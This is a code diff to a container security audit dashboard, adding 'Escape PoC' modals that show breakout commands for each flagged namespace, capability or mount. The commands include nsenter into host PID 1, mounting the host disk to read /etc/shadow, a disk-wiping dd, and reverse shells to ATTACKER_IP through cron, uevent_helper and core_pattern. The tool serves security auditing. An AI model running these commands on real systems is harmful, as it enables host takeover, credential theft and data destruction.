@@ -1890,6 +1890,42 @@ const DashboardHTML = `<!DOCTYPE html>
 
     </div>
 
+    </div>
+
+    <!-- MODAL FOR ESCAPE POCS -->
+    <div id="poc-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(3, 7, 18, 0.85); backdrop-filter: blur(10px); z-index: 9999; align-items: center; justify-content: center;">
+        <div style="background: var(--bg-sidebar); border: 1px solid var(--color-primary); border-radius: 16px; width: 90%; max-width: 650px; padding: 2rem; box-shadow: 0 0 30px rgba(59, 130, 246, 0.2); position: relative; max-height: 90vh; overflow-y: auto;">
+            <button id="poc-modal-close" style="position: absolute; top: 1.25rem; right: 1.25rem; background: transparent; border: none; color: var(--text-secondary); cursor: pointer; font-size: 1.5rem; transition: color 0.2s;" onclick="closePoCModal()">&times;</button>
+            <div style="display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem;">
+                <div style="width: 32px; height: 32px; background-color: var(--color-danger-glow); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 8px; display: flex; align-items: center; justify-content: center;">
+                    <svg style="width: 18px; height: 18px; fill: var(--color-danger);" viewBox="0 0 24 24">
+                        <path d="M12,2L1,21H23L12,2M12,6L19.8,19H4.2L12,6M11,10V14H13V10H11M11,16V18H13V16H11Z"/>
+                    </svg>
+                </div>
+                <h2 style="font-family: var(--font-display); font-size: 1.4rem; font-weight: 700; color: #fff;" id="poc-modal-title">Escape PoC</h2>
+            </div>
+            
+            <p style="color: var(--text-secondary); font-size: 0.9rem; line-height: 1.5; margin-bottom: 1.5rem;" id="poc-modal-desc"></p>
+            
+            <div style="background-color: rgba(239, 68, 68, 0.08); border-left: 4px solid var(--color-danger); padding: 0.75rem 1rem; border-radius: 4px; margin-bottom: 1.5rem;">
+                <span style="font-size: 0.75rem; font-weight: 700; color: var(--color-danger); text-transform: uppercase; letter-spacing: 0.05em; display: block; margin-bottom: 0.25rem;">⚠️ Security Warning</span>
+                <span style="font-size: 0.8rem; color: var(--text-secondary); line-height: 1.4; display: block;">This Proof of Concept (PoC) walkthrough is for authorized security auditing and educational purposes only. Run these commands from a shell inside the container to demonstrate the breakout risk.</span>
+            </div>
+
+            <div style="position: relative; background-color: #020617; border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; margin-bottom: 1.5rem;">
+                <div style="display: flex; justify-content: space-between; align-items: center; background-color: rgba(255,255,255,0.02); padding: 0.5rem 1rem; border-bottom: 1px solid var(--border-color);">
+                    <span style="font-size: 0.7rem; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em;">PoC Breakout Script</span>
+                    <button id="poc-copy-btn" style="background: transparent; border: none; color: var(--color-primary); cursor: pointer; font-size: 0.75rem; font-weight: 600; padding: 0.2rem 0.5rem;" onclick="copyPoC()"></button>
+                </div>
+                <pre style="padding: 1.25rem; font-family: var(--font-mono); font-size: 0.8rem; line-height: 1.5; overflow-x: auto; color: #a5f3fc; margin: 0;" id="poc-modal-code"></pre>
+            </div>
+            
+            <div style="display: flex; justify-content: flex-end;">
+                <button style="background-color: rgba(255, 255, 255, 0.05); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 6px; padding: 0.5rem 1.25rem; font-family: var(--font-display); font-weight: 600; font-size: 0.85rem; cursor: pointer; transition: all 0.2s;" onclick="closePoCModal()">Close</button>
+            </div>
+        </div>
+    </div>
+
     <!-- Hidden Printable template for PDF generation -->
     <div id="pdf-template-container">
         <!-- Rendered completely into multi-page layout dynamically -->
@@ -1898,6 +1934,124 @@ const DashboardHTML = `<!DOCTYPE html>
     <!-- SCRIPT LOGIC -->
     <script>
         let currentReportData = null;
+
+        const ESCAPE_POCS = {
+            'mnt': {
+                title: 'Mount Namespace Escape',
+                desc: 'The container shares the host mount namespace. A privileged container can modify host mount tables or write directly to host filesystems.',
+                poc: '# Since the mount namespace is shared, you can see all host mounts.\n# To see host disks and mount them:\nfdisk -l\n\n# Mount the host drive:\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host'
+            },
+            'pid': {
+                title: 'PID Namespace Escape (nsenter breakout)',
+                desc: 'Sharing the PID namespace allows the container to see and trace host processes, including host PID 1 (systemd init).',
+                poc: '# 1. Verify you can see host processes:\nps aux\n\n# 2. Break out to host shell by entering host namespaces of PID 1:\nnsenter --target 1 --mount --uts --ipc --net --pid /bin/bash'
+            },
+            'net': {
+                title: 'Network Namespace Exposure',
+                desc: 'Sharing the network namespace with the host allows the container to view all host network interfaces, sniff host traffic, and bind to host ports directly.',
+                poc: '# 1. List host interfaces:\nip addr\n\n# 2. Sniff host network traffic (if tcpdump is installed):\ntcpdump -i any\n\n# 3. Listen on host port 80:\ncurl -s --unix-socket /var/run/docker.sock http://localhost/'
+            },
+            'ipc': {
+                title: 'IPC Shared Memory Manipulation',
+                desc: 'Sharing the IPC namespace allows the container to read/write to the host shared memory segments, message queues, and semaphores.',
+                poc: '# 1. List host shared memory segments:\nipcs -m\n\n# 2. Attach or read segments if permissions allow.'
+            },
+            'uts': {
+                title: 'UTS (Hostname) Escape',
+                desc: 'Sharing UTS namespace allows the container to change the hostname of the host machine, disrupting local network identification.',
+                poc: '# Change the hostname of the host machine:\nhostname attacker-controlled-node\n\n# Check the hostname has updated on the host:\nhostname'
+            },
+            'user': {
+                title: 'User Namespace Shared (No virtualization)',
+                desc: 'Sharing the user namespace means root inside the container maps to root on the host. If any breakout occurs, the attacker has instant host root privileges.',
+                poc: '# Root inside container = Root on host.\n# Check your active user privileges:\nid'
+            },
+            'cgroup': {
+                title: 'Cgroup Namespace Leak',
+                desc: 'Leaks directory layout of cgroups, helping attackers map the host system or orchestrator configuration.',
+                poc: '# View the host cgroup tree paths:\ncat /proc/self/cgroup'
+            },
+            'CAP_SYS_ADMIN': {
+                title: 'CAP_SYS_ADMIN Breakout (Disk Mount)',
+                desc: 'CAP_SYS_ADMIN is the most powerful Linux capability. It allows mounting filesystems, modifying kernel configurations, and breaking isolation.',
+                poc: '# 1. Check active capabilities (verify CAP_SYS_ADMIN is present):\ncapsh --print\n\n# 2. List host block devices:\nfdisk -l\n\n# 3. Mount host root partition:\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host\n\n# 4. Access host filesystem files:\ncat /mnt/host/etc/shadow'
+            },
+            'CAP_SYS_RAWIO': {
+                title: 'CAP_SYS_RAWIO Port I/O and Disk Write',
+                desc: 'Allows raw access to I/O ports, physical memory (/dev/mem), and raw disk sector writes, bypassing the filesystem.',
+                poc: '# 1. Write or read raw physical memory (if /dev/mem is accessible):\ndd if=/dev/mem bs=1k count=10 | hexdump -C\n\n# 2. Bypassing filesystem to write directly to block device sector:\ndd if=/dev/zero of=/dev/sda bs=512 count=1'
+            },
+            'CAP_SYS_PTRACE': {
+                title: 'CAP_SYS_PTRACE Process Injection Escape',
+                desc: 'Allows debugging and tracing other processes. If PID namespace is shared or host processes are accessible, an attacker can inject shellcode into a host process.',
+                poc: '# 1. Find a running host process PID (e.g. systemd or sshd):\nps aux\n\n# 2. Inject shellcode or attach debugger (if gdb/strace is installed):\ngdb -p <HOST_PID>\n\n# 3. Call system() in host process memory to run reverse shell.'
+            },
+            'CAP_SYS_MODULE': {
+                title: 'CAP_SYS_MODULE Kernel Module Injection Escape',
+                desc: 'Allows loading and unloading arbitrary Linux Kernel Modules (LKM). Bypasses all container and system controls.',
+                poc: '# 1. Write a malicious kernel module (reverse shell / rootkit)\n# 2. Compile and load it from inside the container:\ninsmod /tmp/rootkit.ko'
+            },
+            'CAP_DAC_OVERRIDE': {
+                title: 'CAP_DAC_OVERRIDE Read/Write Host Files',
+                desc: 'Bypasses file read, write, and execute permission checks. Allows reading or writing to any file inside the mount context.',
+                poc: '# 1. Read files owned by other users regardless of permission settings:\ncat /etc/shadow'
+            },
+            'CAP_CHOWN': {
+                title: 'CAP_CHOWN File Ownership Hijack',
+                desc: 'Allows changing file owner and group. An attacker can change ownership of critical binaries or config files to escalate privileges.',
+                poc: '# Change owner of shell binary or config files to your user:\nchown youruser /etc/passwd'
+            },
+            'docker.sock': {
+                title: 'Docker Socket Exposure Escape',
+                desc: 'Access to /var/run/docker.sock allows talking to the host Docker daemon. You can spawn a privileged container that mounts the host root directory.',
+                poc: '# 1. Verify access to docker socket (install docker client or use curl):\ncurl --unix-socket /var/run/docker.sock http://localhost/containers/json\n\n# 2. Run a breakout container that mounts host root / and enters host namespaces:\ndocker run -it --privileged --pid=host -v /:/host debian chroot /host /bin/bash'
+            },
+            'host_mount': {
+                title: 'Host Path Mount Escape',
+                desc: 'A sensitive path from the host is mounted inside the container. This allows the container to read or modify host files.',
+                poc: '# 1. Write a reverse shell cron job to the host filesystem:\necho "* * * * * root bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\"" > /path/to/mount/etc/cron.d/breakout\n\n# 2. Wait for the host cron daemon to run the payload.'
+            },
+            'sys_mount': {
+                title: 'Writeable /sys/kernel/uevent_helper Escape',
+                desc: 'A writeable /sys mount allows registering a uevent_helper. When a device event is triggered, the kernel executes the uevent helper script outside the container.',
+                poc: '# 1. Create a helper payload inside the container:\necho -e "#!/bin/sh\\n/bin/bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\"" > /tmp/payload.sh\nchmod +x /tmp/payload.sh\n\n# 2. Write the host path of the script to uevent_helper:\necho "/var/lib/docker/overlay2/SOME_HASH/merged/tmp/payload.sh" > /sys/kernel/uevent_helper\n\n# 3. Trigger a device event to execute the payload on the host:\necho add > /sys/class/mem/null/uevent'
+            },
+            'proc_mount': {
+                title: 'Writeable /proc/sys/kernel/core_pattern Escape',
+                desc: 'A writeable host procfs mount allows modifying the core_pattern. When a process crashes, the kernel executes the core_pattern program outside the container.',
+                poc: '# 1. Create crash payload script:\necho -e "#!/bin/sh\\n/bin/bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\"" > /tmp/payload.sh\nchmod +x /tmp/payload.sh\n\n# 2. Write host path of the script to core_pattern:\necho "|/var/lib/docker/overlay2/SOME_HASH/merged/tmp/payload.sh" > /proc/sys/kernel/core_pattern\n\n# 3. Trigger a crash to execute the payload on the host:\nkill -11 0'
+            }
+        };
+
+        function openPoC(key) {
+            const poc = ESCAPE_POCS[key];
+            if (!poc) return;
+            
+            document.getElementById('poc-modal-title').textContent = poc.title;
+            document.getElementById('poc-modal-desc').textContent = poc.desc;
+            document.getElementById('poc-modal-code').textContent = poc.poc;
+            
+            const copyBtn = document.getElementById('poc-copy-btn');
+            copyBtn.textContent = 'Copy Command';
+            copyBtn.disabled = false;
+            
+            document.getElementById('poc-modal').style.display = 'flex';
+        }
+
+        function closePoCModal() {
+            document.getElementById('poc-modal').style.display = 'none';
+        }
+
+        function copyPoC() {
+            const code = document.getElementById('poc-modal-code').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                const btn = document.getElementById('poc-copy-btn');
+                btn.textContent = 'Copied!';
+                setTimeout(() => {
+                    btn.textContent = 'Copy Command';
+                }, 2000);
+            });
+        }
 
         document.addEventListener('DOMContentLoaded', () => {
             loadContainers();
@@ -2157,7 +2311,11 @@ const DashboardHTML = `<!DOCTYPE html>
                 report.namespaces.namespaces.forEach(ns => {
                     const card = document.createElement('div');
                     card.className = 'ns-card ' + (ns.is_shared_with_host ? 'shared' : 'isolated');
-                    card.innerHTML = '<div class="ns-card-header"><span class="ns-card-name">' + escapeHTML(ns.name) + '</span><span class="risk-badge ' + (ns.is_shared_with_host ? ns.risk_level.toLowerCase() : 'info') + '">' + (ns.is_shared_with_host ? 'Shared' : 'Isolated') + '</span></div><div class="ns-inode-row"><span>Target Inode:</span><span class="ns-inode-val">' + ns.target_inode + '</span></div><div class="ns-inode-row"><span>Host Inode:</span><span class="ns-inode-val">' + ns.host_inode + '</span></div><p class="ns-card-desc">' + escapeHTML(ns.description) + '</p>';
+                    let pocBtn = '';
+                    if (ns.is_shared_with_host && ESCAPE_POCS[ns.name]) {
+                        pocBtn = '<button class="btn-audit" style="margin-top:0.5rem;padding:0.25rem 0.5rem;font-size:0.75rem;background-color:var(--color-danger-glow);border:1px solid rgba(239,68,68,0.3);color:var(--color-danger);" onclick="openPoC(\'' + ns.name + '\')">💡 Escape PoC</button>';
+                    }
+                    card.innerHTML = '<div class="ns-card-header"><span class="ns-card-name">' + escapeHTML(ns.name) + '</span><span class="risk-badge ' + (ns.is_shared_with_host ? ns.risk_level.toLowerCase() : 'info') + '">' + (ns.is_shared_with_host ? 'Shared' : 'Isolated') + '</span></div><div class="ns-inode-row"><span>Target Inode:</span><span class="ns-inode-val">' + ns.target_inode + '</span></div><div class="ns-inode-row"><span>Host Inode:</span><span class="ns-inode-val">' + ns.host_inode + '</span></div><p class="ns-card-desc">' + escapeHTML(ns.description) + '</p>' + pocBtn;
                     nsListEl.appendChild(card);
                 });
             }
@@ -2172,7 +2330,11 @@ const DashboardHTML = `<!DOCTYPE html>
             } else {
                 riskCaps.forEach(cap => {
                     const tr = document.createElement('tr');
-                    tr.innerHTML = '<td style="font-family:var(--font-mono);font-weight:600;color:#fff">' + escapeHTML(cap.name) + '</td><td><span class="risk-badge ' + cap.risk_level.toLowerCase() + '">' + escapeHTML(cap.risk_level) + '</span></td><td style="color:var(--text-secondary)">' + escapeHTML(cap.description) + '</td>';
+                    let capNameCell = escapeHTML(cap.name);
+                    if (ESCAPE_POCS[cap.name]) {
+                        capNameCell += ' <button onclick="openPoC(\'' + cap.name + '\')" style="background:transparent;border:none;color:var(--color-danger);cursor:pointer;font-size:0.7rem;font-weight:bold;margin-left:0.5rem;text-decoration:underline">🎓 Escape PoC</button>';
+                    }
+                    tr.innerHTML = '<td style="font-family:var(--font-mono);font-weight:600;color:#fff">' + capNameCell + '</td><td><span class="risk-badge ' + cap.risk_level.toLowerCase() + '">' + escapeHTML(cap.risk_level) + '</span></td><td style="color:var(--text-secondary)">' + escapeHTML(cap.description) + '</td>';
                     riskCapsBody.appendChild(tr);
                 });
             }
@@ -2219,7 +2381,21 @@ const DashboardHTML = `<!DOCTYPE html>
             } else {
                 mountRisks.forEach(risk => {
                     const tr = document.createElement('tr');
-                    tr.innerHTML = '<td style="font-family:var(--font-mono);color:#fff">' + escapeHTML(risk.mount_point) + '</td><td style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-secondary)">' + escapeHTML(risk.mount_source) + '</td><td style="font-family:var(--font-mono)">' + escapeHTML(risk.fs_type) + '</td><td><span class="risk-badge ' + risk.risk_level.toLowerCase() + '">' + escapeHTML(risk.risk_level) + '</span></td><td style="color:var(--text-secondary)">' + escapeHTML(risk.description) + '</td>';
+                    let pocKey = '';
+                    if (risk.mount_source.includes('docker.sock')) {
+                        pocKey = 'docker.sock';
+                    } else if (risk.mount_point.includes('/sys') && (risk.risk_level === 'High' || risk.risk_level === 'Critical')) {
+                        pocKey = 'sys_mount';
+                    } else if (risk.mount_point.includes('/proc') && (risk.risk_level === 'High' || risk.risk_level === 'Critical')) {
+                        pocKey = 'proc_mount';
+                    } else if (risk.risk_level === 'Critical' || risk.risk_level === 'High') {
+                        pocKey = 'host_mount';
+                    }
+                    let mountPointCell = escapeHTML(risk.mount_point);
+                    if (pocKey && ESCAPE_POCS[pocKey]) {
+                        mountPointCell += ' <button onclick="openPoC(\'' + pocKey + '\')" style="background:transparent;border:none;color:var(--color-danger);cursor:pointer;font-size:0.7rem;font-weight:bold;margin-left:0.5rem;text-decoration:underline">🎓 Escape PoC</button>';
+                    }
+                    tr.innerHTML = '<td style="font-family:var(--font-mono);color:#fff">' + mountPointCell + '</td><td style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-secondary)">' + escapeHTML(risk.mount_source) + '</td><td style="font-family:var(--font-mono)">' + escapeHTML(risk.fs_type) + '</td><td><span class="risk-badge ' + risk.risk_level.toLowerCase() + '">' + escapeHTML(risk.risk_level) + '</span></td><td style="color:var(--text-secondary)">' + escapeHTML(risk.description) + '</td>';
                     mountRisksBody.appendChild(tr);
                 });
             }
